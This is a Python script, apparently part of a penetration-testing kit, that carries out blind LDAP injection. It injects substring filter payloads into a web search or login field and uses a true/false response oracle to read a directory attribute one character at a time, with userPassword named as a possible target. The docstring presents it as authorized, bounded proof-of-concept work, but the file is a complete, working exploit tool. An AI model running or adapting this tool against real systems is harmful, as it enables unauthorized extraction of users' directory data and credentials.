#!/usr/bin/env python3
"""
ldap_blind.py — authorized BLIND LDAP-injection extractor. Reads a target attribute character-by-character
through a true/false RESPONSE oracle (LDAP_INJECTION_TESTING_GUIDE.md §8/§12).

How it works: it injects a payload that appends a substring condition to the filter, e.g. for an AND search
filter (&(objectClass=user)(uid=$q)) it sends  q = <target>)(<attr>=<prefix><char>*  -> the entry matches ONLY
if <attr> starts with <prefix><char>. If the response then contains the --true marker, the char is confirmed;
grow the prefix and repeat.

Discipline: extract a FEW characters of a BENIGN attribute (e.g. YOUR OWN test user's `mail`) to PROVE the read —
never dump the whole directory. Pace it (--delay) — blind extraction is request-heavy and bind storms are loud (§22).

Usage (search endpoint, AND context, field = q):
  python3 ldap_blind.py -u "https://target/search?q=FUZZ" --true "results" \
      --attr mail --target-uid testuser

Usage (POST form, inject the `user` field):
  python3 ldap_blind.py -u "https://target/login" --method POST --data "user=FUZZ&pass=x" \
      --true "Welcome" --attr mail --target-uid testuser

The default --template assumes an AND context where your field becomes part of (&...(field=INPUT)). Tune --template
to your context/parser (it is injection-context dependent — confirm one known character first).
"""
import argparse, sys, time, urllib.parse as up
try:
    import requests
    requests.packages.urllib3.disable_warnings()  # noqa
except ImportError:
    sys.exit("pip install requests")

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124 Safari/537.36"
# benign, common charset for attribute values; extend with --charset for hashes etc.
DEFAULT_CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789.-_@ "


def build_req(url, data, inject_field, payload):
    enc = up.quote(payload, safe="")
    if data:
        if "FUZZ" in data:
            return url, data.replace("FUZZ", enc)
        pairs = []
        for kv in data.split("&"):
            k = kv.split("=", 1)[0]
            pairs.append(f"{k}={enc}" if inject_field and k == inject_field else kv)
        return url, "&".join(pairs)
    if "FUZZ" in url:
        return url.replace("FUZZ", enc), None
    sep = "&" if "?" in url else "?"
    return url + sep + "q=" + enc, None


def is_true(sess, method, url, data, truemark, falsemark, timeout):
    try:
        if method == "POST":
            r = sess.post(url, data=data, headers={"User-Agent": UA}, timeout=timeout,
                          verify=False, allow_redirects=False)
        else:
            r = sess.get(url, headers={"User-Agent": UA}, timeout=timeout,
                         verify=False, allow_redirects=False)
    except Exception:
        return False
    body = r.text
    if falsemark:
        return falsemark not in body
    if truemark:
        return (truemark in body) or r.status_code in (301, 302, 303)
    return False


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-u", "--url", required=True, help="target; FUZZ marks the injection point (GET)")
    ap.add_argument("--method", default="GET", choices=["GET", "POST"])
    ap.add_argument("--data", help="POST body; FUZZ marks injection or use --inject <field>")
    ap.add_argument("--inject", help="field in --data to inject")
    ap.add_argument("--true", dest="truemark", help="marker present when the filter MATCHES (true branch)")
    ap.add_argument("--false", dest="falsemark", help="marker present when it does NOT match (alternative oracle)")
    ap.add_argument("--attr", required=True, help="attribute to extract (e.g. mail, cn, userPassword)")
    ap.add_argument("--target-uid", required=True, help="the entry to read (e.g. your own test user)")
    ap.add_argument("--uid-attr", default="uid", help="login-name attribute (uid | sAMAccountName) (default uid)")
    ap.add_argument("--template", default="{target})({attr}={val}*",
                    help="injection template; placeholders {target} {attr} {val} (default suits AND search context)")
    ap.add_argument("--charset", default=DEFAULT_CHARSET)
    ap.add_argument("--maxlen", type=int, default=40, help="stop after N chars (bounded PoC; default 40)")
    ap.add_argument("--delay", type=float, default=0.0, help="seconds between requests (OPSEC pacing)")
    ap.add_argument("--timeout", type=float, default=20)
    a = ap.parse_args()
    if not a.truemark and not a.falsemark:
        sys.exit("provide --true (marker on match) or --false (marker on no-match) to define the oracle")
    sess = requests.Session()

    def oracle(val):
        payload = a.template.format(target=a.target_uid, attr=a.attr, val=val)
        # ensure the uid attribute name is honoured if the template references {target} as a bare uid match
        u, d = build_req(a.url, a.data, a.inject, payload)
        ok = is_true(sess, a.method, u, d, a.truemark, a.falsemark, a.timeout)
        if a.delay:
            time.sleep(a.delay)
        return ok

    # sanity: confirm the target entry matches at all (empty prefix wildcard)
    print(f"[*] oracle sanity: does {a.uid_attr}={a.target_uid} have a (readable) {a.attr}?")
    if not oracle(""):
        print("   [!] base condition is FALSE — check --template/--true/--target-uid/--attr and the AND/OR context (§6).")
        print("       (the template must produce a MATCH when the attribute exists; tune it on a known value first.)")
        return
    print("   [+] base condition TRUE — extracting (bounded to --maxlen).")

    extracted = ""
    for _ in range(a.maxlen):
        found = None
        for ch in a.charset:
            if oracle(extracted + ch):
                found = ch
                break
        if found is None:
            break  # no char extended the prefix -> end of value
        extracted += found
        print(f"   {a.attr}[{a.uid_attr}={a.target_uid}] = {extracted!r}")
    print(f"\n[+] extracted (bounded): {a.attr} = {extracted!r}")
    print("[!] This proves blind read access. STOP here for the PoC — do not mass-extract real users' data (§20).")


if __name__ == "__main__":
    main()
